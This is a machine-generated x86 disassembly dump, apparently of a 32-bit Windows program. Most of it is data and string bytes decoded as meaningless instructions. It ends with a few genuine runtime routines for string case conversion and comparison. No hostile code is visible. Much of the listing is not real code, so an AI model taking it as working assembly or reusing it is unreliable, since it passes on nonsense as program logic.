mov bh 0xff
add [ eax ] al
clc
add dh cl
inc [ eax ]
add al bh
ja r-xdata
into
add ch al
inc [ eax ]
add al bh
ja r-xdata
add ch bl
inc [ eax ]
add al bh
ja r-xdata
add ah dl
inc [ eax ]
add al bh
ja r-xdata
aam 0xff
add [ eax ] al
clc
add bl ch
jmp r-xdata
add dl ah
inc [ eax ]
add al bh
ja r-xdata
add [ eax ] al
clc
loop r-xdata
inc [ eax ]
add al bh
ja r-xdata
add cl bh
mov eax [ 0xfffffffff80000ff ]
add [ eax - 0x7ffff01 ] bh
ja r-xdata
mov eax 0xf80000ff
add bh cl
inc [ eax ]
add al bh
ja r-xdata
iretd
add dh al
inc [ eax ]
add al bh
ja r-xdata
add dh bl
inc [ eax ]
add al bh
ja r-xdata
fdivp st7
add [ eax ] al
clc
add ch dl
inc [ eax ]
add al bh
ja r-xdata
aad 0xff
add [ eax ] al
clc
add ah ch
inc [ eax ]
add al bh
ja r-xdata
inc [ eax ]
add al bh
ja r-xdata
in al dx
add bl ah
inc [ eax ]
add al bh
ja r-xdata
add [ eax ] al
clc
stosd [ edi ]
inc [ eax ]
add al bh
add [ edx - 0x7ffff01 ] ah
ja r-xdata
mov [ 0xfffffffff80000ff ] al
add [ ecx - 0x7ffff01 ] bh
ja r-xdata
mov ecx 0xf80000ff
add [ eax - 0x7ffff01 ] dh
ja r-xdata
mov al 0xff
add [ eax ] al
clc
add bh al
inc [ eax ]
add al bh
ja r-xdata
enter 0xff 0x0
clc
add bh bl
inc [ eax ]
add al bh
ja r-xdata
add dh dl
inc [ eax ]
add al bh
ja r-xdata
salc
inc [ eax ]
add al bh
ja r-xdata
add ch ch
push 0x60636552
add [ eax ] eax
add [ ecx ] al
add [ eax ] al
add [ eax ] bl
mov eax [ eax ]
add [ edi + edi * 8 + 0x77f80000 ] ch
dec ecx
lodsb [ esi ]
inc [ eax ]
add al bh
ja r-xdata
add [ ebx - 0x7ffff01 ] ah
ja r-xdata
mov [ 0xfffffffff80000ff ] eax
add [ edx - 0x7ffff01 ] bh
ja r-xdata
mov edx 0xf80000ff
add [ ecx - 0x7ffff01 ] dh
ja r-xdata
mov cl 0xff
add [ eax ] al
clc
ja r-xdata
add al cl
inc [ eax ]
add al bh
mov dl 0xff
add [ eax ] al
clc
add cl cl
inc [ eax ]
add al bh
ja r-xdata
leave
add al al
inc [ eax ]
add al bh
ja r-xdata
sar bh 0x0
inc [ eax ]
add al bh
ja r-xdata
add bh dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x74 ] dl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x75 ] cl
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
outsd
outsb
cld
mov eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
mov eax [ eax ]
or al 0x0
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ esi ] al
inc ebp
inc ecx
bound ebp [ edi + 0x72 ]
je r-xdata
adc al 0x0
add [ esi - 0x7ffff01 ] ch
add [ eax ] al
xchg esp eax
mov eax [ eax ]
add [ eax ] eax
add [ eax ] al
sbb [ ebx + 0x140040 ] cl
add [ ebp - 0x7ffff01 ] ch
ja r-xdata
lodsd [ esi ]
inc [ eax ]
add al bh
add [ edi + edi * 8 + 0x77f80000 ] ah
dec ecx
movsb [ edi ] [ esi ]
inc [ eax ]
add al bh
ja r-xdata
add [ ebx - 0x7ffff01 ] bh
ja r-xdata
mov ebx 0xf80000ff
ja r-xdata
add [ edx - 0x7ffff01 ] dh
mov esp 0xf80000ff
ja r-xdata
add [ ebx - 0x7ffff01 ] dh
ja r-xdata
mov bl 0xff
add [ eax ] al
clc
add dl cl
inc [ eax ]
add al bh
ja r-xdata
0xff
add al bh
ja r-xdata
add cl al
inc [ eax ]
mov al [ 0xffffffffe8004048 ]
js r-xdata
add [ eax ] al
push cs
inc ebp
inc eax
add al dl
fadd [ eax ]
inc eax
inc esi
inc eax
add [ esi ] cl
inc ebp
dec eax
popad
jo r-xdata
push eax
mov [ eax ] es
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
mov [ eax ] es
adc [ eax ] al
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi - 0x7ffff01 ] ch
ja r-xdata
scasd [ edi ]
inc [ eax ]
add al bh
add [ esi - 0x7ffff01 ] ah
ja r-xdata
scasb [ edi ]
inc [ eax ]
add al bh
add [ ebp - 0x7ffff01 ] ah
ja r-xdata
movsd [ edi ] [ esi ]
inc [ eax ]
add al bh
add [ edi + edi * 8 + 0x77f80000 ] bh
dec ecx
ja r-xdata
cmpsb [ esi ] [ edi ]
inc [ eax ]
add al bh
add [ ebp - 0x7ffff01 ] bh
ja r-xdata
mov ebp 0xf80000ff
add [ edi + edi * 8 + 0x77f80000 ] dh
dec ecx
mov ah 0xff
add [ eax ] al
clc
ja r-xdata
add bl cl
inc [ eax ]
add al bh
ja r-xdata
add [ eax ] al
pushad
lea eax [ eax ]
adc [ eax ] al
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ecx ] cl
inc ebp
inc ebp
js r-xdata
lea eax [ eax ]
or [ ebp + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
xchg esp eax
mov eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffff01 ] dl
ja r-xdata
nop
inc [ eax ]
add al bh
add [ edi - 0x7ffff01 ] ah
ja r-xdata
cmpsd [ esi ] [ edi ]
inc [ eax ]
add al bh
add [ esi - 0x7ffff01 ] bh
mov edi 0xf80000ff
add [ esi - 0x7ffff01 ] dh
ja r-xdata
mov esi 0xf80000ff
add [ ebp - 0x7ffff01 ] dh
ja r-xdata
mov ch 0xff
add [ eax ] al
clc
add ah cl
inc [ eax ]
add al bh
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
mov es [ eax ]
adc [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1000408d ] bh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x100040 ] cl
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ebx ] cl
inc ebp
dec ecx
outsb
dec edi
jne r-xdata
inc ebp
inc eax
add al dl
fadd [ eax ]
inc eax
inc esi
inc eax
add [ eax * 2 + 0x4f74754f ] cl
dec bp
insd
outsd
jb r-xdata
imul ebp [ edi + 0x6e ] 0x408cac90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 4 + 0x100040 ] ch
add [ eax ] al
add al 0x8c
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
mov eax [ eax ]
or al 0x0
add [ eax ] al
rcl [ eax ] 0x40
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ esi ] cl
add [ ecx + 0x1c0000ff ] dl
mov eax [ eax ]
sub al 0x8b
inc eax
add [ esi ] cl
xchg ecx eax
inc [ eax ]
add [ ebx + ecx * 4 ] bl
inc eax
add [ edx ] cl
or [ esi + eax * 2 + 0x69 ] edx
insb
dec esi
add [ eax - 0x7ffff01 ] ch
ja r-xdata
test al 0xff
add [ eax ] al
clc
ja r-xdata
add [ edi - 0x7ffff01 ] bh
test eax 0xf80000ff
add [ eax - 0x7ffff01 ] ah
ja r-xdata
mov al [ 0xfffffffff80000ff ]
ja r-xdata
add [ edi - 0x7ffff01 ] dh
ja r-xdata
mov dh 0xff
add [ eax ] al
clc
ja r-xdata
add ch cl
inc [ eax ]
add al bh
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
enter 0x408e 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
adc al 0x8d
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ esi + 0x100040 ] cl
popad
insb
mov eax eax
mov eax 0x408d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x72 ] dh
jb r-xdata
add [ eax ] al
add [ ecx * 4 + 0x48980040 ] dl
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x1000408d
outsd
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or [ ebp + 0x78 ] eax
arpl [ ebp + 0x70 ] sp
je r-xdata
or cl [ ecx ]
push esp
inc esi
imul ebp [ ebp + 0x4e ] 0x90656d61
ja r-xdata
add [ ecx - 0x7ffff01 ] ch
popad
insd
nop
add [ edx - 0x7ffff01 ] ch
ja r-xdata
stosb [ edi ]
inc [ eax ]
add al bh
ja r-xdata
add [ ecx - 0x7ffff01 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x408e 0x0
adc [ eax ] al
add [ eax ] al
int3
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or dl [ ebx + edx * 2 + 0x65 ]
popad
jb r-xdata
push cs
ja r-xdata
add [ ebx - 0x7ffff01 ] ch
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ edx ] dl
inc ebp
inc ebp
js r-xdata
shl [ eax - 0x72 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] dl
add [ eax ] al
add ah cl
lea eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
imul ebp [ edi + 0x6e ] 0x408e1890
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_409481
xchg esp eax
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
xchg esp eax
inc eax
add [ eax + eax ] cl
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebp + 0xc0040 ] 0x0
inc ebp
jb r-xdata
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
xor al 0x96
imul ebp [ edi + 0x6e ] 0x40959890
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax - 0x75 ] cl
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004095 ] al
add [ eax ] al
outsd
jb r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x4096883f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edi - 0x695bffc0 ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
xchg edi eax
inc eax
add [ eax ] dh
add [ eax ] al
add ah ah
adc [ eax ] eax
cwde
dec eax
inc eax
add [ eax + esi * 2 + 0x70980040 ] cl
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add [ eax + 0x4004070 ] ch
inc esi
inc eax
add ah ah
test [ eax ] 0x24
push esp
dec ebp
jne r-xdata
jb r-xdata
inc eax
add [ eax + eax ] al
add al al
adc [ eax ] al
cwde
add [ esi + edx * 4 ] dh
je r-xdata
inc eax
inc esi
sub [ ebp + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebp + 0x100040 ] dl
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
rcl [ ebx + 0x51 ] 0x8b
outsb
imul edi [ edx + 0x65 ] r-xdata
outsd
inc esp
add [ eax ] al
je r-xdata
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
add eax 0xffffffd4
jmp sub_40f86c
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
dec eax
insb
jae r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x53080040 ] dl
jns r-xdata
outsd
jb r-xdata
call sub_404ec4
pop edi
pop esi
pop ebx
retn
call sub_40dbf4
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar [ ebp + edx * 4 + 0x3110040 ] 0x2e
cmp [ esp + eax ] dh
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xchg ebp eax
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax - 0x75 ] cl
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
jb r-xdata
inc ebp
inc eax
mov al [ 0xffffffffe8004048 ]
push ebp
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ eax + 0x4095 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jne r-xdata
add [ esi + eax * 2 ] al
inc eax
add [ eax ] dh
cmc
inc eax
add [ ebx ] dl
push esp
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
je r-xdata
adc [ ebp + 0x41 ] al
int3
ficom [ eax + edx * 2 - 0x18 ]
in eax 0xff
dec ecx
add [ ebx - 0x7bda0040 ] cl
in al 0x49
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ ebx - 0x74aeac40 ] cl
test ah ah
dec ecx
arpl [ eax + 0x72 ] bp
outsd
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
sar bh 0xff
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
jo r-xdata
popad
outsb
je r-xdata
inc eax
add [ esi ] cl
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6c ] dh
jae r-xdata
add al ch
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ eax ] dl
inc ebp
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax * 2 + 0xc00 ] dl
add [ eax - 0x75 ] cl
inc eax
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
rcl [ eax ] 0x94
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
xchg esp eax
inc eax
add [ eax + eax ] cl
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
outsd
insb
inc ebx
mov eax eax
mov ah 0x93
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 + 0xc0040 ] dh
add [ eax ] al
dec eax
mov eax [ eax ]
cwde
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax + 0x46 ] al
inc eax
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
sub_409688
imul edx [ esi - 0x698cffc0 ] 0x967d0040
inc eax
add [ ecx - 0x6a ] cl
inc eax
add [ ecx - 0x6a ] dl
inc eax
add [ ecx - 0x6a ] bl
inc eax
add [ ecx - 0x6a ] ah
inc eax
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x4096883f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ edi - 0x695bffc0 ] dl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
xchg edi eax
inc eax
add [ eax ] dh
add [ eax ] al
add ah ah
adc [ eax ] eax
cwde
dec eax
inc eax
add [ eax + esi * 2 + 0x70980040 ] cl
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add [ eax + 0x4004070 ] ch
inc esi
inc eax
add ah ah
test [ eax ] 0x24
push esp
dec ebp
jne r-xdata
rcl [ ebx + 0x51 ] 0x8b
outsb
imul edi [ edx + 0x65 ] r-xdata
outsd
inc esp
add [ eax ] al
je r-xdata
call sub_404ec4
pop edi
pop esi
pop ebx
retn
call sub_40dbf4
push edx
popad
inc ebp
js r-xdata
insb
jne r-xdata
ficom [ eax + edx * 2 - 0x18 ]
in eax 0xff
dec ecx
add [ ebx - 0x7bda0040 ] cl
in al 0x49
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ ebx - 0x74aeac40 ] cl
test ah ah
dec ecx
arpl [ eax + 0x72 ] bp
outsd
sub_409738
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_40976c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
pop edi
pop esi
pop ebx
retn
sub_4097a0
push ebx
push ecx
mov ebx edx
push esp
push eax
call sub_409790
test eax 0x80000000
sete al
neg al
sbb eax eax
test eax eax
jne r-xdata
mov eax ebx
mov edx [ esp ]
call sub_405758
mov eax [ esp ]
push eax
call sub_409798
pop edx
pop ebx
retn
mov eax [ rw-data ]
call sub_409754
sub_4097dc
push ebx
push edi
push esi
test eax eax
mov esi eax
mov edi edx
mov eax edx
je r-xdata
pop esi
pop edi
pop ebx
jmp sub_405530
mov edx [ esi - 0x4 ]
test edx edx
je r-xdata
mov ebx edx
call sub_405c6c
mov edi [ edi ]
mov eax [ ebx + esi - 0x4 ]
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x7b7b7b7b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
sub ecx eax
mov [ ebx + edi - 0x4 ] ecx
sub ebx 0x1
and ebx 0xfffffffc
jmp r-xdata
sub ebx 0x4
jae r-xdata
mov eax [ ebx + esi ]
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x7b7b7b7b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
sub ecx eax
mov [ ebx + edi ] ecx
pop esi
pop edi
pop ebx
retn
sub_409864
push ebx
push edi
push esi
test eax eax
mov esi eax
mov edi edx
mov eax edx
je r-xdata
pop esi
pop edi
pop ebx
jmp sub_405530
mov edx [ esi - 0x4 ]
test edx edx
je r-xdata
mov ebx edx
call sub_405c6c
mov edi [ edi ]
mov eax [ ebx + esi - 0x4 ]
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x5b5b5b5b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
add ecx eax
mov [ ebx + edi - 0x4 ] ecx
sub ebx 0x1
and ebx 0xfffffffc
jmp r-xdata
sub ebx 0x4
jae r-xdata
mov eax [ ebx + esi ]
mov ecx eax
or eax 0x80808080
mov edx eax
sub eax 0x5b5b5b5b
xor edx ecx
or eax 0x80808080
sub eax 0x66666666
and eax edx
shr eax 0x2
add ecx eax
mov [ ebx + edi ] ecx
pop esi
pop edi
pop ebx
retn
sub_4098ec
cmp eax edx
je r-xdata
xor eax eax
retn
test eax edx
je r-xdata
test eax eax
je r-xdata
movzx ecx [ edx ]
cmp cl [ eax ]
je r-xdata
sub eax [ edx - 0x4 ]
retn
test edx edx
jne r-xdata
push ebx
mov ebx [ eax - 0x4 ]
xor ecx ecx
sub ebx [ edx - 0x4 ]
push ebx
adc ecx 0xffffffff
and ecx ebx
sub ecx [ eax - 0x4 ]
sub eax ecx
sub edx ecx
movzx eax [ eax ]
sub eax ecx
retn
mov eax [ eax - 0x4 ]
retn
bsf ebx ebx
shr ebx 0x3
add ecx ebx
jns r-xdata
add ecx 0x4
js r-xdata
pop eax
pop ebx
retn
movzx eax [ ecx + eax ]
movzx edx [ ecx + edx ]
sub eax edx
pop ebx
pop ebx
retn
mov ebx [ ecx + eax ]
xor ebx [ ecx + edx ]
jne r-xdata
sub_409954
add eax ecx
add edx ecx
xor ecx 0xffffffff
add eax 0xfffffff8
add edx 0xfffffff8
add ecx 0x9
push ebx
jg r-xdata
cmp ecx 0x4
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
cmp ecx 0x6
jg r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
xor eax eax
pop ebx
retn
lea ebx [ ecx + eax ]
add ecx 0x4
and ebx 0x3
sub ecx ebx
jg r-xdata
cmp ecx 0x7
jg r-xdata
movzx ebx [ ecx + eax ]
cmp bx [ ecx + edx ]
jne r-xdata
add ecx 0x4
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
mov eax 0x1
pop ebx
retn
movzx ebx [ eax + 0x7 ]
